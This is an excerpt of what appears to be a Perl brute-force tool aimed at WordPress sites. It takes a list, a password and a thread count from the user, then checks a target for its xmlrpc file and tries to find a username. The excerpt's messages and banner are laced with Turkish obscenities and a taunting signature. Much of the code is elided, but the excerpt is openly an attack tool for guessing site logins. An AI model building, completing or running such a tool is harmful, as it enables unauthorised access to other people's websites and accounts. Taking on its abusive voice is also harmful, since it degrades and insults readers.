...
my $list=<STDIN>;
chomp($list);
print color("bold blue"),"[+] Şifreyi gir : ";
print color 'reset';
my $file=<STDIN>;
chomp($file);
print color("bold blue"),"[+] kaç deneme yapayım : ";
print color 'reset';
my $thread=<STDIN>;
chomp($thread);
my $threads = $thread;
...
sub exploiter {
    ...
    print color ("bold green"),"\n    + Amina kodugumun xmlrpc dosyası lazim.";print color 'reset';
    check_xmlrpc ($link);
    print color ("bold green"),"\n    + Siktigimin yerinde kullanici adini bulmaya calisiyiorum ";print color 'reset';
    get_user ($link);
    print "\n";
    }
}
...
sub flag {
    print q{
       ...
       Fucker Bull Saygıyla Hepinizi Siker
